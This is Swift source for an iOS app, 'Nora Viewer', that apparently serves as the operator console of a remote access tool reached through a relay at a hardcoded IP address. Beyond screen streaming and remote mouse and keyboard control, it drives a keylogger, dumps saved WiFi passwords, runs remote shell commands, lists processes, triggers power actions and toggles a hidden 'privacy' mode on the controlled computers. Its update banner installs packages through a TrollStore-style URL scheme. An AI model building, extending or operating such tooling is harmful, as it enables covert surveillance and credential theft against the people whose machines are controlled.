import SwiftUI
import AVFoundation
import Combine
import UIKit
import WebRTC

// MARK: - App entry point

@main
struct NoraViewerApp: App {
    init() {
        BackgroundKeepAlive.shared.start()
    }
    var body: some Scene {
        WindowGroup { RootView() }
    }
}

// MARK: - ViewModel

@MainActor
final class AppVM: ObservableObject {

    // Connection
    @Published var relayHost = "162.35.37.67"
    @Published var relayPort = "5000"
    @Published var isConnected = false
    @Published var statusMsg   = ""

    // Agents
    @Published var agents:        [String] = []
    @Published var selectedAgent: String?  = nil

    // JPEG stream
    @Published var jpegImage:   UIImage? = nil
    @Published var jpegStreaming = false

    // FastCap stream
    @Published var fcFrame:  CVPixelBuffer? = nil
    @Published var fcActive = false

    // WebRTC stream
    @Published var wrtcTrack:  RTCVideoTrack? = nil
    @Published var wrtcActive  = false
    @Published var wrtcStatus  = ""

    // Remote control — virtual cursor position (0…1 normalized)
    @Published var rcEnabled    = false
    @Published var showKeyboard = false
    @Published var vcX: Double  = 0.5
    @Published var vcY: Double  = 0.5
    var rcSensitivity: Double   = 1.0

    // Hub features state
    @Published var privacyActive   = false
    @Published var keylogActive    = false
    @Published var keylogBuffer    = ""
    @Published var sysInfoText     = ""
    @Published var shellOutput     = ""
    @Published var shellRunning    = false
    @Published var screenshotImage: UIImage? = nil
    @Published var hubBusy         = false
    @Published var hubStatusMsg    = ""
    @Published var showScreenshot  = false
    @Published var hubShellInput   = ""
    @Published var wifiPasswords   = ""
    @Published var processes:      [[String: Any]] = []

    // Update
    @Published var updateInfo: ReleaseInfo? = nil

    // Active tab
    @Published var tab: ViewTab = .jpeg

    // Internals
    private(set) var relay: RelayClient?
    private let decoder = H264Decoder()
    private let wrtc    = WebRTCClient()
    private var bag = Set<AnyCancellable>()

    enum ViewTab { case jpeg, fastcap, webrtc, hub }

    // MARK: - Connect / Disconnect

    func connect() {
        guard let url = URL(string: "http://\(relayHost):\(relayPort)") else {
            statusMsg = "Invalid URL"; return
        }
        let r = RelayClient(relayURL: url)

        r.onLog = { [weak self] msg in
            Task { @MainActor in self?.statusMsg = msg }
        }

        r.$agents.receive(on: DispatchQueue.main)
            .assign(to: \.agents, on: self)
            .store(in: &bag)

        r.$connected.receive(on: DispatchQueue.main)
            .assign(to: \.isConnected, on: self)
            .store(in: &bag)

        r.onJpegFrame = { [weak self] data in
            guard let img = UIImage(data: data) else { return }
            Task { @MainActor in self?.jpegImage = img }
        }

        r.onFastcapReady = { [weak self] in
            Task { @MainActor in
                guard let self else { return }
                self.decoder.onFrame = { [weak self] pb in
                    Task { @MainActor in self?.fcFrame = pb }
                }
                self.fcActive  = true
                self.tab       = .fastcap
                self.statusMsg = "FastCap stream active"
            }
        }

        r.onFastcapFrame = { [weak self] annexB in
            self?.decoder.feed(annexB: annexB)
        }

        r.onWebrtcOffer = { [weak self] sdp, typ in
            self?.wrtc.handleOffer(sdp: sdp, type: typ)
        }

        // Hub feature callbacks
        r.onPrivacyResult = { [weak self] active, msg in
            Task { @MainActor in
                self?.privacyActive = active
                self?.hubStatusMsg  = msg
                self?.hubBusy       = false
            }
        }

        r.onScreenshotResult = { [weak self] img in
            Task { @MainActor in
                self?.screenshotImage = img
                self?.showScreenshot  = img != nil
                self?.hubBusy         = false
                self?.hubStatusMsg    = img == nil ? "Screenshot failed" : ""
            }
        }

        r.onSysInfoResult = { [weak self] d in
            Task { @MainActor in
                self?.sysInfoText = Self._formatSysInfo(d)
                self?.hubBusy     = false
            }
        }

        r.onCommandResult = { [weak self] out in
            Task { @MainActor in
                self?.shellOutput += out + "\n"
                self?.hubBusy     = false
            }
        }

        r.onKeylogStatus = { [weak self] running, err in
            Task { @MainActor in
                self?.keylogActive = running
                if !err.isEmpty { self?.hubStatusMsg = "Keylog: \(err)" }
                self?.hubBusy = false
            }
        }

        r.onKeyChar = { [weak self] ch in
            Task { @MainActor in
                self?.keylogBuffer += ch
                // Trim to last 2000 chars
                if let s = self?.keylogBuffer, s.count > 2000 {
                    self?.keylogBuffer = String(s.suffix(2000))
                }
            }
        }

        r.onShellOutput = { [weak self] data, closed in
            Task { @MainActor in
                self?.shellOutput  += data
                if closed {
                    self?.shellRunning  = false
                    self?.shellOutput  += "\n[shell closed]\n"
                }
            }
        }

        r.onWifiPasswords = { [weak self] d in
            Task { @MainActor in
                if let nets = d["networks"] as? [[String: Any]] {
                    self?.wifiPasswords = nets.map { n in
                        let ssid = n["ssid"] as? String ?? "?"
                        let pw   = n["password"] as? String ?? "(none)"
                        return "\(ssid): \(pw)"
                    }.joined(separator: "\n")
                } else {
                    self?.wifiPasswords = d["error"] as? String ?? "(no data)"
                }
                self?.hubBusy = false
            }
        }

        r.onProcesses = { [weak self] procs in
            Task { @MainActor in
                self?.processes = procs
                self?.hubBusy   = false
            }
        }

        // Wire WebRTC signaling → relay
        wrtc.emitSignal = { [weak self] event, extras in
            print("[iOS] wrtc emitSignal: \(event)")
            guard let self else { return }
            guard let rc = self.relay else {
                self.wrtcStatus = "no relay connection"; return
            }
            switch event {
            case "webrtc_request": rc.webrtcRequest()
            case "webrtc_answer":
                rc.webrtcAnswer(sdp:  extras["sdp"]  as? String ?? "",
                                type: extras["type"] as? String ?? "answer")
            case "webrtc_stop":    rc.webrtcStop()
            default: self.statusMsg = "unknown webrtc signal: \(event)"
            }
        }
        wrtc.onLog = { [weak self] msg in
            print("[iOS] wrtc: \(msg)")
            Task { @MainActor in self?.wrtcStatus = msg }
        }
        wrtc.onConnectionState = { [weak self] s in
            Task { @MainActor in
                self?.wrtcActive = (s == .connected || s == .connecting || s == .new)
            }
        }
        wrtc.onRemoteTrack = { [weak self] track in
            Task { @MainActor in self?.wrtcTrack = track }
        }

        relay = r
        r.connect()

        checkForUpdate()
    }

    func disconnect() {
        stopJpeg()
        stopFastcap()
        stopWebrtc()
        relay?.disconnect()
        relay = nil
        bag.removeAll()
        isConnected   = false
        agents        = []
        selectedAgent = nil
        jpegImage     = nil
        fcFrame       = nil
        fcActive      = false
        jpegStreaming  = false
    }

    // MARK: - WebRTC

    func startWebrtc() {
        wrtcActive = true
        tab        = .webrtc
        wrtc.start()
    }

    func stopWebrtc() {
        wrtc.stop()
        wrtcTrack  = nil
        wrtcActive = false
    }

    func attachWebrtcRenderer(_ renderer: RTCVideoRenderer) {
        wrtc.attachRenderer(renderer)
    }

    // MARK: - Remote control

    func rcClick(normX: Double, normY: Double) {
        guard rcEnabled else { return }
        relay?.mouseClick(x: normX, y: normY)
    }

    func rcRightClick(normX: Double, normY: Double) {
        guard rcEnabled else { return }
        relay?.mouseRightClick(x: normX, y: normY)
    }

    func rcMove(normX: Double, normY: Double) {
        guard rcEnabled else { return }
        relay?.mouseMove(x: normX, y: normY)
    }

    func rcDown(normX: Double, normY: Double) {
        guard rcEnabled else { return }
        relay?.mouseDown(x: normX, y: normY)
    }

    func rcUp(normX: Double, normY: Double) {
        guard rcEnabled else { return }
        relay?.mouseUp(x: normX, y: normY)
    }

    func rcScroll(dy: Double) {
        guard rcEnabled else { return }
        relay?.scroll(dy: dy)
    }

    func rcTypeChar(_ ch: String) {
        relay?.typeText(ch)
    }

    func sendSpecialKey(_ key: SpecialKey) {
        relay?.keyPress(key: key.key, code: key.code, ctrl: key.ctrlKey)
    }

    enum SpecialKey: String, CaseIterable, Identifiable {
        case esc, tab, enter, backspace, up, down, left, right, win, ctrlC, ctrlV, ctrlX, ctrlA, ctrlZ
        var id: String { rawValue }
        var label: String {
            switch self {
            case .esc:       return "Esc"
            case .tab:       return "Tab"
            case .enter:     return "↵"
            case .backspace: return "⌫"
            case .up:        return "↑"
            case .down:      return "↓"
            case .left:      return "←"
            case .right:     return "→"
            case .win:       return "⊞"
            case .ctrlC:     return "^C"
            case .ctrlV:     return "^V"
            case .ctrlX:     return "^X"
            case .ctrlA:     return "^A"
            case .ctrlZ:     return "^Z"
            }
        }
        var key: String {
            switch self {
            case .esc:       return "Escape"
            case .tab:       return "Tab"
            case .enter:     return "Enter"
            case .backspace: return "Backspace"
            case .up:        return "ArrowUp"
            case .down:      return "ArrowDown"
            case .left:      return "ArrowLeft"
            case .right:     return "ArrowRight"
            case .win:       return "Meta"
            case .ctrlC:     return "c"
            case .ctrlV:     return "v"
            case .ctrlX:     return "x"
            case .ctrlA:     return "a"
            case .ctrlZ:     return "z"
            }
        }
        var code: String {
            switch self {
            case .esc:       return "Escape"
            case .tab:       return "Tab"
            case .enter:     return "Enter"
            case .backspace: return "Backspace"
            case .up:        return "ArrowUp"
            case .down:      return "ArrowDown"
            case .left:      return "ArrowLeft"
            case .right:     return "ArrowRight"
            case .win:       return "MetaLeft"
            case .ctrlC:     return "KeyC"
            case .ctrlV:     return "KeyV"
            case .ctrlX:     return "KeyX"
            case .ctrlA:     return "KeyA"
            case .ctrlZ:     return "KeyZ"
            }
        }
        var ctrlKey: Bool {
            switch self {
            case .ctrlC, .ctrlV, .ctrlX, .ctrlA, .ctrlZ: return true
            default: return false
            }
        }
    }

    // MARK: - Hub feature commands

    func hubPrivacyToggle() {
        hubBusy = true
        if privacyActive { relay?.privacyStop() } else { relay?.privacyStart() }
    }

    func hubScreenshot() {
        hubBusy = true
        relay?.takeScreenshot()
    }

    func hubGetSysInfo() {
        hubBusy    = true
        sysInfoText = ""
        relay?.getSysInfo()
    }

    func hubShellRun(_ cmd: String) {
        hubBusy     = true
        relay?.runCommand(cmd)
    }

    func hubShellStartInteractive() {
        shellOutput  = ""
        shellRunning = true
        relay?.shellStart()
    }

    func hubShellSend(_ text: String) {
        relay?.shellInput(text)
    }

    func hubShellStopInteractive() {
        relay?.shellStop()
        shellRunning = false
    }

    func hubKeylogToggle() {
        hubBusy = true
        if keylogActive { relay?.keylogOff() } else { relay?.keylogOn() }
    }

    func hubPower(_ action: String) {
        relay?.powerAction(action)
    }

    func hubGetWifi() {
        hubBusy      = true
        wifiPasswords = ""
        relay?.getWifiPasswords()
    }

    func hubGetProcesses() {
        hubBusy   = true
        processes = []
        relay?.getProcesses()
    }

    // MARK: - Agent selection

    func selectAgent(_ name: String) {
        selectedAgent = name
        relay?.selectAgent(name)
    }

    // MARK: - JPEG stream

    func startJpeg() {
        jpegStreaming = true
        relay?.startJpegStream()
    }

    func stopJpeg() {
        jpegStreaming = false
        jpegImage = nil
        relay?.stopJpegStream()
    }

    // MARK: - FastCap

    func requestFastcap() {
        fcActive = true
        tab      = .fastcap
        statusMsg = "Joining FastCap…"
        relay?.joinFastcap()
    }

    func stopFastcap() {
        relay?.stopFastcap()
        fcFrame  = nil
        fcActive = false
    }

    // MARK: - Helpers

    private static func _formatSysInfo(_ d: [String: Any]) -> String {
        var lines: [String] = []
        let order = ["hostname", "os", "arch", "cpu", "ram_gb", "ram_used_gb",
                     "disk_gb", "disk_used_gb", "uptime_h", "username", "ip"]
        for k in order {
            if let v = d[k] { lines.append("\(k): \(v)") }
        }
        for (k, v) in d where !order.contains(k) {
            lines.append("\(k): \(v)")
        }
        return lines.joined(separator: "\n")
    }

    // MARK: - Update check

    private func checkForUpdate() {
        UpdateChecker.check { [weak self] info in
            Task { @MainActor in self?.updateInfo = info }
        }
    }
}

// MARK: - Root view

struct RootView: View {
    @StateObject private var vm = AppVM()

    var body: some View {
        Group {
            if !vm.isConnected {
                ConnectView(vm: vm)
            } else if vm.selectedAgent == nil {
                AgentPickerView(vm: vm)
            } else {
                MainViewerView(vm: vm)
            }
        }
        .overlay(alignment: .top) {
            if let info = vm.updateInfo {
                UpdateBanner(info: info) { vm.updateInfo = nil }
            }
        }
    }
}

// MARK: - Connect view

struct ConnectView: View {
    @ObservedObject var vm: AppVM

    var body: some View {
        NavigationStack {
            Form {
                Section("Relay server") {
                    HStack {
                        TextField("Host", text: $vm.relayHost)
                            .autocapitalization(.none)
                            .disableAutocorrection(true)
                            .keyboardType(.URL)
                        Text(":")
                        TextField("Port", text: $vm.relayPort)
                            .keyboardType(.numberPad)
                            .frame(width: 70)
                    }
                }
                Section {
                    Button(action: vm.connect) {
                        Label("Connect", systemImage: "wifi")
                    }
                    if !vm.statusMsg.isEmpty {
                        Text(vm.statusMsg)
                            .font(.caption)
                            .foregroundStyle(.secondary)
                    }
                }
            }
            .navigationTitle("Nora Viewer")
        }
    }
}

// MARK: - Agent picker

struct AgentPickerView: View {
    @ObservedObject var vm: AppVM

    var body: some View {
        NavigationStack {
            Group {
                if vm.agents.isEmpty {
                    VStack(spacing: 16) {
                        ProgressView()
                        Text("Waiting for agents…")
                            .foregroundStyle(.secondary)
                        Text(vm.statusMsg)
                            .font(.caption)
                            .foregroundStyle(.secondary)
                    }
                } else {
                    List(vm.agents, id: \.self) { agent in
                        Button {
                            vm.selectAgent(agent)
                        } label: {
                            Label(agent, systemImage: "desktopcomputer")
                        }
                    }
                }
            }
            .navigationTitle("Select Device")
            .toolbar {
                ToolbarItem(placement: .navigationBarLeading) {
                    Button("Disconnect") { vm.disconnect() }
                }
            }
        }
    }
}

// MARK: - Main viewer

struct MainViewerView: View {
    @ObservedObject var vm: AppVM

    var body: some View {
        ZStack(alignment: .bottom) {
            Color.black.ignoresSafeArea()

            // Video / hub area
            Group {
                switch vm.tab {
                case .jpeg:    JpegViewerPanel(vm: vm)
                case .fastcap: FastcapViewerPanel(vm: vm)
                case .webrtc:  WebrtcViewerPanel(vm: vm)
                case .hub:     HubFeaturesView(vm: vm)
                }
            }

            // Trackpad overlay — only active on video tabs when RC is enabled
            if vm.rcEnabled && vm.tab != .hub {
                GeometryReader { geo in
                    TrackpadOverlay(vm: vm, viewSize: geo.size)
                }
                .ignoresSafeArea()

                // Virtual cursor dot
                GeometryReader { geo in
                    Circle()
                        .fill(Color.white.opacity(0.85))
                        .frame(width: 14, height: 14)
                        .shadow(color: .black.opacity(0.5), radius: 2)
                        .position(x: geo.size.width  * vm.vcX,
                                  y: geo.size.height * vm.vcY)
                        .allowsHitTesting(false)
                }
                .ignoresSafeArea()

                // RC badge
                VStack {
                    HStack {
                        Spacer()
                        Text("RC — drag to move  •  tap to click  •  2-finger tap = right click")
                            .font(.caption2.bold())
                            .padding(.horizontal, 8).padding(.vertical, 4)
                            .background(Color.red.opacity(0.85))
                            .foregroundColor(.white)
                            .clipShape(Capsule())
                            .padding(.top, 8).padding(.trailing, 12)
                    }
                    Spacer()
                }
                .allowsHitTesting(false)
            }

            // Dictate keyboard bar (above tab bar)
            if vm.showKeyboard && vm.tab != .hub {
                DictateKeyboardBar(vm: vm)
                    .padding(.bottom, 56)
            }

            // Bottom toolbar
            VStack(spacing: 0) {
                Divider().overlay(Color.gray.opacity(0.5))
                HStack(spacing: 0) {
                    TabButton(label: "JPEG",    icon: "photo",           active: vm.tab == .jpeg)    { vm.tab = .jpeg }
                    TabButton(label: "FastCap", icon: "bolt.fill",       active: vm.tab == .fastcap) { vm.tab = .fastcap }
                    TabButton(label: "WebRTC",  icon: "waveform.path.ecg", active: vm.tab == .webrtc)  { vm.tab = .webrtc }
                    TabButton(label: "Hub",     icon: "gearshape.2.fill", active: vm.tab == .hub)     { vm.tab = .hub }

                    Spacer()

                    // RC toggle (hide when in hub tab)
                    if vm.tab != .hub {
                        Button { vm.rcEnabled.toggle() } label: {
                            Image(systemName: vm.rcEnabled ? "cursorarrow.click.2" : "cursorarrow")
                                .font(.system(size: 18))
                                .padding(.horizontal, 10).padding(.vertical, 12)
                        }
                        .foregroundColor(vm.rcEnabled ? .red : .gray)

                        Button { vm.showKeyboard.toggle() } label: {
                            Image(systemName: "keyboard")
                                .font(.system(size: 18))
                                .padding(.horizontal, 10).padding(.vertical, 12)
                        }
                        .foregroundColor(vm.showKeyboard ? .accentColor : .gray)
                    }

                    Button { vm.selectedAgent = nil } label: {
                        Image(systemName: "chevron.left")
                            .padding(.horizontal, 12).padding(.vertical, 12)
                    }
                    .foregroundColor(.white)
                }
                .background(Color.black.opacity(0.85))
            }
        }
        .statusBarHidden(true)
        .sheet(isPresented: $vm.showScreenshot) {
            if let img = vm.screenshotImage {
                VStack {
                    HStack {
                        Spacer()
                        Button("Close") { vm.showScreenshot = false }
                            .padding()
                    }
                    ScrollView([.horizontal, .vertical]) {
                        Image(uiImage: img)
                            .resizable()
                            .scaledToFit()
                    }
                }
                .background(Color.black)
            }
        }
    }
}

// MARK: - Trackpad overlay (relative mouse movement)

struct TrackpadOverlay: UIViewRepresentable {
    @ObservedObject var vm: AppVM
    let viewSize: CGSize

    func makeUIView(context: Context) -> UIView {
        let v = UIView()
        v.backgroundColor = .clear
        let c = context.coordinator
        c.hostView = v

        // 1-finger pan → relative cursor movement
        let pan1 = UIPanGestureRecognizer(target: c, action: #selector(Coordinator.handlePan(_:)))
        pan1.minimumNumberOfTouches = 1
        pan1.maximumNumberOfTouches = 1
        pan1.delegate = c
        v.addGestureRecognizer(pan1)

        // 2-finger pan → scroll
        let pan2 = UIPanGestureRecognizer(target: c, action: #selector(Coordinator.handleScroll(_:)))
        pan2.minimumNumberOfTouches = 2
        pan2.maximumNumberOfTouches = 2
        pan2.delegate = c
        v.addGestureRecognizer(pan2)

        // 1-finger tap → left click at current virtual cursor
        let tap1 = UITapGestureRecognizer(target: c, action: #selector(Coordinator.handleTap(_:)))
        tap1.numberOfTouchesRequired = 1
        tap1.require(toFail: pan1)
        v.addGestureRecognizer(tap1)

        // 2-finger tap → right click
        let tap2 = UITapGestureRecognizer(target: c, action: #selector(Coordinator.handleTap2(_:)))
        tap2.numberOfTouchesRequired = 2
        tap2.require(toFail: pan2)
        v.addGestureRecognizer(tap2)

        // Long press → right click (alternative)
        let lp = UILongPressGestureRecognizer(target: c, action: #selector(Coordinator.handleLongPress(_:)))
        lp.minimumPressDuration = 0.5
        lp.numberOfTouchesRequired = 1
        lp.delegate = c
        v.addGestureRecognizer(lp)

        // Drag (mousedown → move → mouseup)
        let drag = UILongPressGestureRecognizer(target: c, action: #selector(Coordinator.handleDrag(_:)))
        drag.minimumPressDuration = 0.08
        drag.numberOfTouchesRequired = 1
        drag.allowableMovement = 500
        drag.delegate = c
        v.addGestureRecognizer(drag)
        c.dragRecognizer = drag

        return v
    }

    func updateUIView(_ v: UIView, context: Context) {}

    func makeCoordinator() -> Coordinator {
        Coordinator(vm: vm)
    }

    // MARK: Coordinator

    @MainActor
    class Coordinator: NSObject, UIGestureRecognizerDelegate {
        var vm: AppVM
        weak var hostView: UIView?
        weak var dragRecognizer: UIGestureRecognizer?
        private var lastPanTranslation: CGPoint = .zero
        private var isDragging = false

        init(vm: AppVM) { self.vm = vm }

        func gestureRecognizer(_ g: UIGestureRecognizer,
                               shouldRecognizeSimultaneouslyWith other: UIGestureRecognizer) -> Bool {
            // Allow long-press + pan simultaneously for drag
            return false
        }

        func gestureRecognizer(_ g: UIGestureRecognizer,
                               shouldRequireFailureOf other: UIGestureRecognizer) -> Bool {
            return false
        }

        @objc func handlePan(_ g: UIPanGestureRecognizer) {
            guard let v = hostView else { return }
            let w = Double(v.bounds.width)
            let h = Double(v.bounds.height)
            guard w > 0, h > 0 else { return }

            switch g.state {
            case .began:
                lastPanTranslation = g.translation(in: v)
            case .changed:
                let t  = g.translation(in: v)
                let dx = Double(t.x - lastPanTranslation.x)
                let dy = Double(t.y - lastPanTranslation.y)
                lastPanTranslation = t

                vm.vcX = max(0, min(1, vm.vcX + (dx / w) * vm.rcSensitivity))
                vm.vcY = max(0, min(1, vm.vcY + (dy / h) * vm.rcSensitivity))
                vm.rcMove(normX: vm.vcX, normY: vm.vcY)
            default:
                break
            }
        }

        @objc func handleScroll(_ g: UIPanGestureRecognizer) {
            guard let v = hostView, g.state == .changed else { return }
            let vel = g.velocity(in: v)
            // Normalize scroll: convert px/s to a reasonable scroll step
            let dy = Double(vel.y) / 3000.0
            vm.rcScroll(dy: -dy)
        }

        @objc func handleTap(_ g: UITapGestureRecognizer) {
            vm.rcClick(normX: vm.vcX, normY: vm.vcY)
        }

        @objc func handleTap2(_ g: UITapGestureRecognizer) {
            vm.rcRightClick(normX: vm.vcX, normY: vm.vcY)
        }

        @objc func handleLongPress(_ g: UILongPressGestureRecognizer) {
            if g.state == .began {
                vm.rcRightClick(normX: vm.vcX, normY: vm.vcY)
            }
        }

        @objc func handleDrag(_ g: UILongPressGestureRecognizer) {
            switch g.state {
            case .began:
                isDragging = true
                vm.rcDown(normX: vm.vcX, normY: vm.vcY)
            case .ended, .cancelled, .failed:
                if isDragging {
                    isDragging = false
                    vm.rcUp(normX: vm.vcX, normY: vm.vcY)
                }
            default: break
            }
        }
    }
}

// MARK: - Dictate keyboard bar

// Hidden UITextField that sends every keystroke to the PC immediately.
// No Send button — each character typed goes live.

struct DictateKeyboardBar: View {
    @ObservedObject var vm: AppVM
    @State private var dictateRef: DictateFieldHost? = nil

    var body: some View {
        VStack(spacing: 6) {
            // Tap area — tapping shows the iOS keyboard
            ZStack {
                DictateFieldRepresentable(
                    onChar:       { ch in vm.rcTypeChar(ch) },
                    onSpecialKey: { k  in vm.sendSpecialKey(k) }
                )
                .frame(height: 36)
                .opacity(0)   // invisible but receives input focus

                Text("⌨ Keyboard live — type to send directly to PC")
                    .font(.caption)
                    .foregroundColor(Color.white.opacity(0.6))
                    .allowsHitTesting(false)
            }
            .frame(maxWidth: .infinity, minHeight: 36)
            .background(Color.gray.opacity(0.25))
            .clipShape(RoundedRectangle(cornerRadius: 8))

            // Special keys row
            ScrollView(.horizontal, showsIndicators: false) {
                HStack(spacing: 6) {
                    ForEach(AppVM.SpecialKey.allCases) { k in
                        Button(k.label) { vm.sendSpecialKey(k) }
                            .font(.system(size: 14, weight: .medium, design: .monospaced))
                            .padding(.horizontal, 10).padding(.vertical, 6)
                            .background(Color.gray.opacity(0.3))
                            .foregroundColor(.white)
                            .clipShape(RoundedRectangle(cornerRadius: 6))
                    }
                }
            }
        }
        .padding(.horizontal, 10).padding(.vertical, 8)
        .background(Color.black.opacity(0.9))
    }
}

// UITextField wrapper that becomes first responder immediately and sends
// each keystroke to the PC without buffering.
struct DictateFieldRepresentable: UIViewRepresentable {
    var onChar:       (String) -> Void
    var onSpecialKey: (AppVM.SpecialKey) -> Void

    func makeUIView(context: Context) -> UITextField {
        let tf = UITextField()
        tf.delegate = context.coordinator
        tf.autocorrectionType    = .no
        tf.autocapitalizationType = .none
        tf.spellCheckingType     = .no
        tf.smartQuotesType       = .no
        tf.smartDashesType       = .no
        tf.keyboardType          = .default
        tf.returnKeyType         = .default
        tf.backgroundColor       = .clear
        tf.textColor             = .clear
        tf.tintColor             = .clear
        tf.text = "X"  // sentinel so backspace is always detectable
        DispatchQueue.main.async { _ = tf.becomeFirstResponder() }
        return tf
    }

    func updateUIView(_ tf: UITextField, context: Context) {
        // Re-focus if the keyboard was dismissed (e.g. user scrolled away)
        if !tf.isFirstResponder {
            DispatchQueue.main.async { _ = tf.becomeFirstResponder() }
        }
        // Ensure sentinel is present
        if tf.text?.isEmpty == true { tf.text = "X" }
    }

    func makeCoordinator() -> Coordinator { Coordinator(self) }

    final class Coordinator: NSObject, UITextFieldDelegate {
        let parent: DictateFieldRepresentable
        init(_ p: DictateFieldRepresentable) { parent = p }

        func textField(_ tf: UITextField,
                       shouldChangeCharactersIn range: NSRange,
                       replacementString string: String) -> Bool {
            if string.isEmpty {
                // Backspace key
                parent.onSpecialKey(.backspace)
            } else {
                for ch in string {
                    if ch == "\n" {
                        parent.onSpecialKey(.enter)
                    } else {
                        parent.onChar(String(ch))
                    }
                }
            }
            // Reset sentinel so backspace always works
            DispatchQueue.main.async { tf.text = "X" }
            return false
        }

        func textFieldShouldReturn(_ tf: UITextField) -> Bool {
            parent.onSpecialKey(.enter)
            return false
        }
    }
}

// Helper for DictateFieldRepresentable host reference (unused; kept for future)
class DictateFieldHost: ObservableObject {}

// MARK: - Tab button

struct TabButton: View {
    let label: String
    let icon:  String
    let active: Bool
    let action: () -> Void

    var body: some View {
        Button(action: action) {
            VStack(spacing: 2) {
                Image(systemName: icon)
                    .font(.system(size: 16, weight: .medium))
                Text(label).font(.caption2)
            }
            .padding(.horizontal, 16)
            .padding(.vertical, 10)
            .foregroundColor(active ? .accentColor : .gray)
        }
    }
}

// MARK: - JPEG panel

struct JpegViewerPanel: View {
    @ObservedObject var vm: AppVM

    var body: some View {
        ZStack {
            if let img = vm.jpegImage {
                Image(uiImage: img)
                    .resizable()
                    .scaledToFit()
                    .ignoresSafeArea()
            } else if vm.jpegStreaming {
                VStack(spacing: 12) {
                    ProgressView()
                    Text("Waiting for frames…").foregroundStyle(.white).font(.headline)
                }
            } else {
                VStack(spacing: 16) {
                    Image(systemName: "photo.on.rectangle").font(.largeTitle).foregroundColor(.gray)
                    Text("Tap Start to begin JPEG stream").foregroundStyle(.gray)
                }
            }

            VStack {
                Spacer()
                HStack(spacing: 20) {
                    if !vm.jpegStreaming {
                        ActionButton(title: "▶ Start JPEG", color: .green) { vm.startJpeg() }
                    } else {
                        ActionButton(title: "■ Stop JPEG", color: .red)   { vm.stopJpeg() }
                    }
                }
                .padding(.bottom, 56)
            }
        }
    }
}

// MARK: - FastCap panel

struct FastcapViewerPanel: View {
    @ObservedObject var vm: AppVM

    var body: some View {
        ZStack {
            if let pb = vm.fcFrame {
                PixelBufferView(pixelBuffer: pb).ignoresSafeArea()
            } else if vm.fcActive {
                VStack(spacing: 12) {
                    ProgressView()
                    Text("Waiting for H.264 frames…").foregroundStyle(.white).font(.headline)
                }
            } else {
                VStack(spacing: 16) {
                    Image(systemName: "bolt.fill").font(.largeTitle).foregroundColor(.gray)
                    Text("Tap Start FastCap for H.264 stream").foregroundStyle(.gray)
                }
            }

            VStack {
                Spacer()
                HStack(spacing: 20) {
                    if !vm.fcActive {
                        ActionButton(title: "⚡ Start FastCap", color: .orange) { vm.requestFastcap() }
                    } else {
                        ActionButton(title: "■ Stop FastCap", color: .red)     { vm.stopFastcap() }
                    }
                }
                .padding(.bottom, 56)
            }
        }
    }
}

// MARK: - WebRTC panel

struct WebrtcViewerPanel: View {
    @ObservedObject var vm: AppVM

    var body: some View {
        ZStack {
            if vm.wrtcTrack != nil {
                WebrtcVideoView(vm: vm).ignoresSafeArea()
            } else if vm.wrtcActive {
                VStack(spacing: 12) {
                    ProgressView()
                    Text("Negotiating WebRTC…").foregroundStyle(.white).font(.headline)
                    if !vm.wrtcStatus.isEmpty {
                        Text(vm.wrtcStatus)
                            .font(.caption).foregroundStyle(.gray)
                            .multilineTextAlignment(.center)
                            .padding(.horizontal, 32)
                    }
                }
            } else {
                VStack(spacing: 16) {
                    Image(systemName: "waveform.path.ecg").font(.largeTitle).foregroundColor(.gray)
                    Text("Tap Start WebRTC for low-latency stream").foregroundStyle(.gray)
                }
            }

            VStack {
                Spacer()
                HStack(spacing: 20) {
                    if !vm.wrtcActive {
                        ActionButton(title: "📶 Start WebRTC", color: .blue) { vm.startWebrtc() }
                    } else {
                        ActionButton(title: "■ Stop WebRTC", color: .red)   { vm.stopWebrtc() }
                    }
                }
                .padding(.bottom, 56)
            }
        }
    }
}

struct WebrtcVideoView: UIViewRepresentable {
    @ObservedObject var vm: AppVM

    func makeUIView(context: Context) -> RTCMTLVideoView {
        let v = RTCMTLVideoView(frame: .zero)
        v.videoContentMode = .scaleAspectFit
        vm.attachWebrtcRenderer(v)
        return v
    }

    func updateUIView(_ v: RTCMTLVideoView, context: Context) {}
}

struct ActionButton: View {
    let title:  String
    let color:  Color
    let action: () -> Void

    var body: some View {
        Button(action: action) {
            Text(title)
                .font(.subheadline.bold())
                .padding(.horizontal, 20)
                .padding(.vertical, 10)
                .background(color.opacity(0.85))
                .foregroundColor(.white)
                .clipShape(Capsule())
        }
    }
}

// MARK: - Update banner

struct UpdateBanner: View {
    let info:    ReleaseInfo
    let dismiss: () -> Void

    var body: some View {
        HStack {
            Image(systemName: "arrow.down.circle.fill")
                .foregroundColor(.green)
            VStack(alignment: .leading, spacing: 2) {
                Text("Update \(info.tag) available")
                    .font(.subheadline.bold())
                Text("Tap to auto-install")
                    .font(.caption)
                    .foregroundStyle(.secondary)
            }
            Spacer()
            Button(action: dismiss) {
                Image(systemName: "xmark")
                    .foregroundStyle(.secondary)
            }
        }
        .padding(12)
        .background(.thinMaterial)
        .onTapGesture {
            let trollURL = URL(string: "apple-magnifier://install?url=\(info.ipaURL.absoluteString)")!
            if UIApplication.shared.canOpenURL(trollURL) {
                UIApplication.shared.open(trollURL)
            } else {
                UIApplication.shared.open(info.ipaURL)
            }
        }
    }
}

// MARK: - AVSampleBufferDisplayLayer wrapper

struct PixelBufferView: UIViewRepresentable {
    let pixelBuffer: CVPixelBuffer

    func makeUIView(context: Context) -> _DisplayView { _DisplayView() }

    func updateUIView(_ v: _DisplayView, context: Context) {
        v.show(pixelBuffer)
    }
}

final class _DisplayView: UIView {
    private let layer2 = AVSampleBufferDisplayLayer()

    override init(frame: CGRect) {
        super.init(frame: frame)
        layer2.videoGravity = .resizeAspect
        layer2.backgroundColor = UIColor.black.cgColor
        layer.addSublayer(layer2)
    }
    required init?(coder: NSCoder) { fatalError() }

    override func layoutSubviews() {
        super.layoutSubviews()
        layer2.frame = bounds
    }

    func show(_ pb: CVPixelBuffer) {
        var fd: CMVideoFormatDescription?
        CMVideoFormatDescriptionCreateForImageBuffer(
            allocator: nil, imageBuffer: pb, formatDescriptionOut: &fd)
        guard let fd else { return }

        var timing = CMSampleTimingInfo(
            duration:              .invalid,
            presentationTimeStamp: CMClockGetTime(CMClockGetHostTimeClock()),
            decodeTimeStamp:       .invalid
        )
        var sb: CMSampleBuffer?
        CMSampleBufferCreateReadyWithImageBuffer(
            allocator: nil, imageBuffer: pb,
            formatDescription: fd, sampleTiming: &timing,
            sampleBufferOut: &sb)
        guard let sb else { return }

        if layer2.status == .failed { layer2.flush() }
        layer2.enqueue(sb)
    }
}
